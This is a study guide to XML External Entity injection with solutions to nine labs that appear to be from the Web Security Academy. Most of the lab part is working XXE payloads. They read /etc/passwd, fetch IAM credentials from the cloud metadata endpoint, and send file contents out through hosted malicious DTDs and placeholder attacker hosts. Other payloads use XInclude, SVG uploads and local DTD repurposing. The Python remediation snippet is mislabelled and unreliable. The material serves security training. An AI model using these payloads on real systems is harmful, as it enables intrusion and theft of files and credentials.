
## 1. Vulnerability Core

- **Vulnerability Type:** XML External Entity Injection (XXE)
    
- **Core Meaning:** XXE vulnerabilities arise when an insecurely configured XML parser processes an incoming XML document containing custom entity definitions. The XML standard permits declaring entities whose values are pulled from external resources via system identifiers (URI/file paths), allowing an attacker to force the parsing engine to load arbitrary system files or make unauthorized network requests.
    
- **The Downstream Pivot:** Attackers can escalate XXE to perform Server-Side Request Forgery (SSRF) to scan internal corporate networks, interface with restricted cloud infrastructure management panels (e.g., AWS/EC2 metadata endpoints), exfiltrate backend application configuration flags via out-of-band channels, or trigger denial-of-service conditions.
    

## 2. Detection & Attack Surface Mapping (In the Wild)

Uncovering XXE injection points involves locating inputs that process structured hierarchical markup data or accept formats with embedded XML components.

### Identifying High-Risk Code Features

- **XML-Structured APIs:** Endpoint routes utilizing SOAP, XML-RPC, or standard REST architectures communicating via `Content-Type: application/xml` or `text/xml`.
    
- **Rich Document Parsers:** Form upload components that handle file structures with compressed XML properties (e.g., DOCX, XLSX, SVG images, or PDF vectors).
    
- **Hidden XML Aggregators:** Backend services that wrap text parameters inside transactional backend layers (such as a standard web form parameter formatting a backend SOAP payload).
    

### Active Probing Strategy

- **Content-Type Mutation:** Change the client transmission header from `Content-Type: application/x-www-form-urlencoded` or `application/json` to `Content-Type: text/xml`. Reformat the raw post payload body into standard XML markers (`<root>payload</root>`) to see if the server accepts and parses the alternative structural type.
    
- **Parameter Entity Probing:** When standard XML tags are stripped or sanitized, test the DTD wrapper block using percent-sign (`%`) parameter entities to detect blind out-of-band network signals.
    
- **XInclude Injections:** If you can modify an input string value that is processed by a backend XML template but cannot write a complete standalone `<!DOCTYPE>` header block, use the alternative `<xi:include>` structural syntax to force file reads.
    

## 3. Classifications (The Scenarios)

- **In-Band Entity Extraction:** Direct configuration path where the XML document parses an external entity reference and reflects the text file output smoothly back inside the HTTP client response wrapper.
    
- **Metadata SSRF Pivoting:** Interfacing with a system parser to force an outbound connection to an internal address block or a non-routable cloud network gateway to capture environment variables or metadata files.
    
- **Blind OAST Parameter Injection:** The server acts on the XML input but does not return text reflections or parse errors. Attackers use an external network listener to capture automated outbound DNS or HTTP check-ins.
    
- **External DTD Data Exfiltration:** Leveraging an externally hosted `.dtd` schema payload to stitch local file contents directly into a dynamic URL subsegment, leaking target files through a remote network connection log.
    
- **Local Error-Based Reflection:** Forcing a validation error by appending file text directly into an invalid system file path format (`file:///invalid/%file;`), causing the internal engine log dump to print out file data inside the raw error description stack trace.
    
- **XInclude Sub-Document Merging:** Injecting specific XML namespace tags directly inside isolated text fields to force document splitting and arbitrary local reads.
    
- **File Header Extraction (SVG/Office Docs):** Uploading media vectors containing hidden text element strings linked to local system references to make the server render system names directly onto processed images.
    

## 4. Remediation

- **Completely Disable External Entities (XXE):** The most secure defense against XXE is to explicitly reconfigure the application's XML parsing libraries to refuse `external-general-entities` and `external-parameter-entities` entirely.
    
- **Disable DTD Support:** Instruct the active parsing engine instance to disregard custom DOCTYPE declarations globally:
    
    Python
    
    ```
    # Example for Python's defusedxml / lxml configuration mapping
    parser_config.setFeature("http://xml.org/sax/features/external-general-entities", False)
    parser_config.setFeature("http://xml.org/sax/features/external-parameter-entities", False)
    ```
    

## 5. Lab Breakthroughs & Payloads

### Lab 1: Exploiting XXE using external entities to retrieve files

- **Attack Vector:** An in-band XML endpoint processes custom DOCTYPE references and reflects the value of the parameter entity back within the response string.
    

 ### 🛑 **SOLUTION & PAYLOAD BREAKDOWN**
 
 **Exploitation Routine (Payload):** Inject a custom system entity reference directly between the standard XML block headers, then replace the product query value with the entity declaration marker:
 
 XML
 
 ```
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
 <stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
 ```

 - **Verification:** The engine processes the `&xxe;` pointer, reads the local file, and prints the raw contents of `/etc/passwd` directly inside the returned product validation error message.
     

### Lab 2: Exploiting XXE to perform SSRF attacks

- **Attack Vector:** Utilizing the external parsing directive to route request tokens through the internal loopback environment to look up system metadata coordinates.
    

 ### 🛑 SOLUTION & PAYLOAD BREAKDOWN
 
 **Exploitation Routine (Payload):**
 
 1. [ ] Set the system utility path to hit the cloud metadata engine interface IP address:
     
 
 XML
 
 ```
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://169.254.169.254/"> ]>
 <stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
 ```

 2. [ ] Read the returned folder directories and update your URI search path sequentially through the exposed structure until you reach the admin credential object:
     
 
 XML
 
 ```
 <!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]>
 ```

### Lab 3: Blind XXE with out-of-band interaction

- **Attack Vector:** The response doesn't mirror text data or return parsing messages. Confirmation requires inducing an out-of-band web hit back to a controlled listener.
    

### 🛑 SOLUTION & PAYLOAD BREAKDOWN
 
 **Exploitation Routine (Payload):** Intercept the stock request XML data and map the system variable tracking target directly to a unique Burp Collaborator subdomain:
 
 XML
 
 ```
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE stockCheck [ <!ENTITY xxe SYSTEM "http://YOUR-SUBDOMAIN.oastify.com"> ]>
 <stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
 ```
 
 - **Verification:** Check your Burp Collaborator panel and click **Poll Now** to observe the incoming DNS/HTTP lookup entries originating from the laboratory server.
     

### Lab 4: Blind XXE with out-of-band interaction via XML parameter entities

- **Attack Vector:** Standard general entities are filtered or rejected by application input rules. Bypassing this restriction requires leveraging internal DTD parameter symbols (`%`).
    

 ### 🛑 **SOLUTION & PAYLOAD BREAKDOWN**
 
 **Exploitation Routine (Payload):** Declare a parameter entity using the `%` syntax within the DTD block, then execute its lookups immediately before exiting the schema logic block:
 
 XML
 
 ```
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM "http://YOUR-SUBDOMAIN.oastify.com"> %xxe; ]>
 <stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
 ```

### Lab 5: Exploiting blind XXE to exfiltrate data using a malicious external DTD

- **Attack Vector:** Blind exfiltration through a multi-tiered parameter entity chain. Requires hosting a secondary schema template file that dynamically nests file values within an outbound web request query parameter.
    

 ### 🛑 **SOLUTION & PAYLOAD BREAKDOWN**

 **Exploitation Routine (Payload):**
 
 1. [ ] Create a text layout schema mapping document titled `malicious.dtd` on your accessible exploit platform server containing the following multi-stage lookup directive:
     
 
 XML
 
 ```
 <!ENTITY % file SYSTEM "file:///etc/hostname">
 <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://YOUR-SUBDOMAIN.oastify.com/?x=%file;'>">
 %eval;
 %exfil;
 ```

 2. [ ] Submit an in-band web request payload referencing your hosted layout file to force the application to download, compile, and execute your exfiltration instructions:
     
 
 XML
 
 ```
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://YOUR-EXPLOIT-SERVER.net/malicious.dtd"> %xxe;]>
 <stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
 ```

 3. [ ] Read your Collaborator panel results to find the incoming HTTP connection query parameter (`?x=...`), which contains the extracted server hostname.
     

### Lab 6: Exploiting blind XXE to retrieve data via error messages

- **Attack Vector:** Data output is blind, but the environment prints verbose structural parser errors back in the HTTP response body.
    

 ### 🛑 **SOLUTION & PAYLOAD BREAKDOWN**
 
 **Exploitation Routine (Payload):**
 
 1. [ ] Host a structured error-triggering DTD template file on your remote exploit dashboard server:
     
 
 XML
 
 ```
 <!ENTITY % file SYSTEM "file:///etc/passwd">
 <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///invalid/%file;'>">
 %eval;
 %exfil;
 ```
 
 2. [ ] Inject a root parameter lookup string into the incoming product request payload pointing directly back to your server's DTD path:
     
 
 XML
 
 ```
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://YOUR-EXPLOIT-SERVER.net/error.dtd"> %xxe;]>
 <stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
 ```

 - **Verification:** The server downloads your DTD, tries to open a file path using the contents of `/etc/passwd` as the filename, fails, and prints the target file's raw text directly into the returned `FileNotFoundException` error trace message.
     

### Lab 7: Exploiting XInclude to retrieve files

- **Attack Vector:** Traditional DOCTYPE modifications are blocked because the user-supplied data is embedded into a predefined server-side XML layout. You can bypass this restriction by injecting standalone XInclude elements.
    

 ### 🛑 **SOLUTION & PAYLOAD BREAKDOWN**
 
 **Exploitation Routine (Payload):** Identify the parameter field (`productId`) that is embedded into the backend XML document. Supply an explicit reference to the XInclude namespace, targeting the internal password file directly:
 
 HTTP
 
 ```
 POST /product/stock HTTP/1.1
 Host: YOUR-LAB-ID.web-security-academy.net
 Content-Type: application/x-www-form-urlencoded
 
 productId=<foo+xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include+parse="text"+href="file:///etc/passwd"/></foo>&storeId=1
 ```

### Lab 8: Exploiting XXE via image file upload

- **Attack Vector:** An application avatar upload portal runs data checks on uploaded media files using an XML-compatible image processing library (Apache Batik), opening up an entry point for embedded SVG payloads.
    

### 🛑 SOLUTION & PAYLOAD BREAKDOWN
 
 **Exploitation Routine (Payload):**
 
 1. [ ] Generate a raw text file locally named `exploit.svg` containing an embedded XML text rendering vector linked to an external system entity:
     
 
 SVG
 `<?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>`
 2. [ ] Upload the `exploit.svg` file as your new profile avatar via the application's comment form interface.
     
 3. [ ] Reload the blog page, locate your posted comment, and view the rendered avatar image source in your browser. The server-side graphics library will have drawn the text contents of `/etc/hostname` directly onto the pixel canvas of your profile picture.


# XML External Entity (XXE) Injection: Advanced Constraints

## 1. Vulnerability Core

- **Vulnerability Type:** Blind XXE via Local DTD Repurposing
    
- **Core Meaning:** According to the XML specification, nesting a parameter entity inside another parameter entity is strictly forbidden within a purely internal DTD declaration block. However, a loophole exists: if an internal DTD loads an **external DTD file that already exists locally on the target server's filesystem**, the parser relaxes this restriction. This allows an attacker to redefine an entity originally declared in that local DTD, triggering an error-based exfiltration chain entirely in-band without needing an outbound internet connection.
    
- **The Downstream Pivot:** This technique is a critical bottleneck bypass. When a target network employs strict egress filtering—blocking all outbound OAST connections (like Burp Collaborator) and preventing the inclusion of remote `.dtd` files—repurposing a local system DTD allows an attacker to pivot from a completely blind state to a localized, error-based data exfiltration primitive.
    

## 2. Detection & Attack Surface Mapping (In the Wild)

Finding local DTD structures requires checking for error reflections while mapping common asset directories on standard server configurations.

### Identifying High-Risk Code Features

- **Hardened Firewalls:** API entry points that process XML inputs but exhibit zero network egress behavior during standard OAST probing attempts.
    
- **Verbose Local Error Logging:** Systems that catch XML parsing anomalies and echo the internal processing exceptions directly back into the response payload body.
    

### Active Probing Strategy

Because this attack requires a valid target file path, you must first enumerate the local filesystem to discover which system application packages are installed.

#### Step 1: Enumerate Local DTD Presence

Submit a basic parameter entity pointing to common operating system DTD paths. If the server handles the request normally (no file-not-found error), the file exists:

XML

```
<!DOCTYPE foo [
  <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
  %local_dtd;
]>
```

#### Common Local DTD Path Wordlist

|Operating System / Environment|Common Local DTD Filesystem Paths|
|---|---|
|**Linux (GNOME / Yelp)**|`/usr/share/yelp/dtd/docbookx.dtd`|
|**Linux (DocBook Enterprise)**|`/usr/share/xml/docbook/schema/dtd/4.5/docbookx.dtd`|
|**Mac OS X**|`/usr/share/kdext/dtd/plugins.dtd`|
|**Windows / JBoss**|`C:\jboss-6.1.0.Final\common\lib\jbossts-common.jar` (or nested inside local engine schemas)|

## 3. Classifications (The Scenarios)

- **Local Hybrid Internal/External Exploitation:** Situations where network perimeter policies block external domain resolutions entirely, forcing the parsing engine to combine local block fragments with internal logic overrides.
    
- **Entity Override Manipulation:** Targeting a specific, pre-existing structural identifier inside a vendor-packaged schema configuration map, then filling it with a malformed nesting loop to force out cleartext data dumps.
    

## 4. Remediation

- **Global Entity Disabling:** Instruct the underlying parser engine instance to fully disable external entity resolution capabilities, ensuring it ignores the `SYSTEM` directive entirely even when directed to local filesystem schemas:

Java

```
// Secure Java XML Configuration
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
```

### Lab 9: Exploiting XXE to retrieve data by repurposing a local DTD

- **Attack Vector:** Blind endpoint featuring aggressive firewall filters that block external web hooks, but print structural document engine stack errors natively back to the screen.
    

 ### 🛑 SOLUTION & PAYLOAD BREAKDOWN
 
 **Exploitation Routine (Payload):**
 
 1. [ ] Issue a verification request to check for the presence of the default GNOME desktop application documentation DTD template (`docbookx.dtd`).
     
 2. [ ] Once verified, look up the schema file's open-source definition to identify a target parameter entity available for redefinition: `ISOamso`.
     
 3. [ ] Construct a multi-tiered entity payload inside the transactional `POST /product/stock` submission data block. Load the local template file, overwrite its `ISOamso` definition with a nested dynamic string handler, and point the invalid target structure directly to `/etc/passwd`:
     
 
 XML
 
 ```
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE message [
 <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
 <!ENTITY % ISOamso '
 <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
 <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
 &#x25;eval;
 &#x25;error;
 '
 %local_dtd;
 ]>
 <stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
 ```

 4. [ ] Send the data payload. The parsing layout engine processes the file definition, registers the overridden inner `ISOamso` logic block, attempts to read from a non-existent sub directory path composed of the text contents of `/etc/passwd`, and errors out—revealing the entire file data directly on the page inside the return string.
